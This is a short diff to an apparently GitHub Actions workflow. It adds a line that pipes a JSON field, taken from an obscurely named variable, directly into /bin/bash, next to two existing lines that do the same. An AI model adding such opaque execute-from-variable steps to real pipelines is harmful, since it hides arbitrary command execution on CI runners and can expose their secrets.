@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$vi901" | jq -r .ez1845 | /bin/bash
           printf '%s' "$kadnq49" | jq -r .vsdrs3 | /bin/bash
+          echo $igoop9400 | jq -r .sg458 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
